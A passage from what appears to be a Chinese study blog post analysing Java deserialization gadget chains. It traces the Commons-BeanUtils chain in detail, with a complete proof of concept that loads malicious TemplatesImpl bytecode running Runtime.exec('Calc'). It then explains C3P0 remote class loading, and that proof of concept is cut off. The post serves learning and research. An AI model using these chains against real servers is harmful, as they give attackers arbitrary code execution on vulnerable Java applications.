<p><font style="color:rgb(80, 80, 92);">此时，Commons-BeanUtils 会自动找到 name 属性的getter 方法，也就是 getName ，然后调用并获得返回值。这个形式就很自然得想到能任意函数调用。</font></p>
<h4 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h4><p>这条链的前半部分是cc4的链子，同样是通过defindClass来加载恶意类的字节码文件，来达到任意执行恶意类。</p>
<p>但是入口与之前的有所区别，链子整体如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TemplatesImpl</span>#<span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">TemplatesImpl</span>#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span>

<span class="token class-name">TemplatesImpl</span>#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">TemplatesImpl</span>#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token operator">-></span> <span class="token class-name">TransletClassLoader</span>#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们这里的入口类<code>TemplatesImpl#getOutputProperties()</code>这个是个get方法，我们在介绍的<font style="color:rgb(80, 80, 92);">Commons-BeanUtils在利用静态方法 </font><code>PropertyUtils.getProperty</code>的时候能够自动调用类中相应变量的对应get方法。所以我们就可以通过<font style="color:rgb(80, 80, 92);">静态方法 </font><code>PropertyUtils.getProperty</code>来进行对<code>TemplatesImpl#getOutputProperties()</code>调用。如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 伪代码</span>
<span class="token class-name">PropertyUtils</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token class-name">TemplatesImpl</span><span class="token punctuation">,</span> outputProperties<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="中间部分"><a href="#中间部分" class="headerlink" title="中间部分"></a>中间部分</h4><p>现在我们已经确定<code>PropertyUtils.getProperty</code>能够正常调用<code>TemplatesImpl#getOutputProperties()</code>方法了，现在只需要找到哪一个调用了<font style="color:rgb(80, 80, 92);">静态方法 </font><code>PropertyUtils.getProperty</code>就可以了</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1726033184395-acba20ea-0bea-4c48-bf60-094ef3403a2d.png"><br>我们能够看到在<code>BeanComparator</code>类中存在一个compare方法对其进行了掉用，然后我们再找什么对compare进行了调用，然后发现在<font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">PriorityQueue</font>   类中存在一个<font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">siftDownUsingComparator()</font> 方法对其进行了调用<img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1726033461182-4a33e07f-6164-4bf7-8f28-a047b942bc80.png"></p>
<p>继续向下寻找，会在同一个类中的<code>siftDown()</code>调用了这个类。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1726034779509-36e618fa-e3db-40e7-ac08-6fd36574b3b1.png"></p>
<p>然后又能在同一个类中的<code>heapify()</code>方法调用了<code>siftDown</code>方法，然后一直寻找，最后能找到入口类</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/44011315/1726035167477-23a514e3-1cc7-47f1-a975-03d5847c5020.png"></p>
<h4 id="寻找readObject入口类"><a href="#寻找readObject入口类" class="headerlink" title="寻找readObject入口类"></a>寻找readObject入口类</h4><p>最后我们在readObject方法中找到了对heapify方法的调用：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1726035207187-efc1c46a-0937-4f38-ae91-1563f7cb17a6.png"></p>
<p>到此为止，我们的链子的整体流程就能做出来了。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PriorityQueue</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">PriorityQueue</span><span class="token punctuation">.</span><span class="token function">heapify</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">-></span>
	
	<span class="token class-name">PriorityQueue</span><span class="token punctuation">.</span><span class="token function">siftDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token class-name">PriorityQueue</span><span class="token punctuation">.</span><span class="token function">siftDownUsingComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span>
	
		<span class="token class-name">BeanComparator</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span>
<span class="token class-name">PropertyUtils</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token class-name">TemplatesImpl</span><span class="token punctuation">,</span> outputProperties<span class="token punctuation">)</span>
	<span class="token operator">-></span>
			<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h4><p>依照上面的链子，我们的恶意代码不需要改动，直接用之前cc4的就行</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>TemplatesImplClassLoader</span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>  
  
<span class="token comment">// TemplatesImpl 的字节码构造  </span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplatesBytes</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> dom<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> dom<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  
    <span class="token keyword">public</span> <span class="token class-name">TemplatesBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>  
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后得到的链子如下:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">PropertyUtils</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CB1FinalEXP</span> <span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"E:\\JavaClass\\TemplatesBytes.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token comment">//    templates.newTransformer();  </span>
 <span class="token keyword">final</span> <span class="token class-name">BeanComparator</span> beanComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token comment">// 创建新的队列，并添加恶意字节码  </span>
 <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> beanComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>  
 queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
 <span class="token comment">// 将 property 的值赋为 outputProperties </span>
 <span class="token function">setFieldValue</span><span class="token punctuation">(</span>beanComparator<span class="token punctuation">,</span> <span class="token string">"property"</span><span class="token punctuation">,</span> <span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token function">setFieldValue</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">,</span> templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token function">serialize</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>  
 field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>  
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name">Filename</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>  
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token class-name">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token keyword">return</span> obj<span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="C3P0反序列化"><a href="#C3P0反序列化" class="headerlink" title="C3P0反序列化"></a>C3P0反序列化</h3><p> C3P0 是一个开源的 JDBC 数据库连接池库，主要用于管理数据库连接池 。先在下面解释几个概念</p>
<p><strong>JDBC</strong></p>
<blockquote>
<p> JDBC（Java Database Connectivity，Java 数据库连接）是 Java 提供的一组 API，用于执行 SQL 语句并与关系型数据库进行交互。JDBC 使得 Java 应用程序能够连接到不同类型的数据库（如 MySQL、PostgreSQL、Oracle 等），执行查询、插入、更新、删除等操作，并获取结果  </p>
</blockquote>
<p><strong>连接池</strong></p>
<blockquote>
<p> 连接池（Connection Pool）是一种用于管理数据库连接的技术，其目的是减少应用程序与数据库交互时建立和释放数据库连接的开销。它通过在应用启动时预先创建一组数据库连接，并在需要时重用这些连接，从而提高应用程序的性能和响应速度。  </p>
</blockquote>
<h4 id="链子分析-1"><a href="#链子分析-1" class="headerlink" title="链子分析"></a>链子分析</h4><p>C3P0这条链现有三种利用方式，分别是</p>
<ul>
<li>http base</li>
<li>JNDI</li>
<li>HEX序列化字节加载（ClassLoder）</li>
</ul>
<p><font style="color:rgb(76, 73, 72);">在原生的反序列化中，如果找不到其他的链，则可以尝试C3P去加载远程执行的类进行命令执行。JNDI则适用于</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;jackSon&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">等利用，而Hex 序列化字节加载器的方式可以利用与</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;fastjson&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">或者</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;JackSon&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">等不出网的情况下进行利用</font></p>
<h5 id="远程类加载（URLClassLoader）"><a href="#远程类加载（URLClassLoader）" class="headerlink" title="远程类加载（URLClassLoader）"></a><font style="color:rgb(76, 73, 72);">远程类加载（URLClassLoader）</font></h5><p>在<font style="color:rgb(92, 92, 92);">PoolBackedDataSourceBase类中存在writeObject方法中存在这样的一个地方：</font></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1727855164591-d37bd57b-8053-469e-9447-3bbedbf515a0.png"></p>
<p>在这段中，会先对connectionPoolDataSource这个属性尝试反序列化，如果不成功就在catch中进行处理，通过indirector.indirectForm()这个方法进行序列化处理，跟进这个方法后我们能够发现这个。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1727856256410-18e97a1f-199f-41fd-984b-28652f5ca73e.png"></p>
<p>这个方法<font style="color:rgb(92, 92, 92);">会调用connectionPoolDataSource属性的getReference方法，并用返回结果作为参数实例化一个ReferenceSerialized对象，然后将ReferenceSerialized对象返回，ReferenceSerialized被序列化,然后由于reference这个参数可控。所以我们便可成功序列化</font></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1727857599680-2e3b0694-4702-4da3-a9f5-f9c0dfedec20.png"></p>
<p>上面是序列化，再来看反序列化，反序列化再readObject方法中。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1727858131468-749ae799-6e61-49dc-a78b-4ed16a9a4462.png"></p>
<p>在readObject方法中，会通过 getObject()  方法来进行反序列化获取对象，结合上文，如果ReferenceSerialized被序列化到了序列流中，那么这里可以是ReferenceSerialized#getObject，我们进行跟进。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/44011315/1727858855677-781d11dc-fdd3-4e83-a84a-bae1019b62f1.png"></p>
<p>发现最后调用了ReferenceableUtils.referenceToObject这个方法，继续向下跟进</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1727858994336-6d87377f-049f-468b-88d6-2a7efc7918fd.png"></p>
<p>由于ref在序列化的时候是可控的，所以这里的fClassName和fClassLocation也是可控的，而且最后这块有个newinstance</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1727859695997-2542ed66-d9b1-4165-9f6d-e84d89942f73.png"></p>
<p>所以最后能够得到如下poc</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token constant">C3P0</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>mchange<span class="token punctuation">.</span>v2<span class="token punctuation">.</span>c3p0<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">PoolBackedDataSourceBase</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>mchange<span class="token punctuation">.</span>v2<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ReferenceIndirector</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Name</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Referenceable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ConnectionPoolDataSource</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">PooledConnection</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLFeatureNotSupportedException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>logging<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">PoolBackedDataSourceBase</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PoolBackedDataSourceBase</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> f1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"connectionPoolDataSource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//此类是PoolBackedDataSourceBase抽象类的实现</span>
        f1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
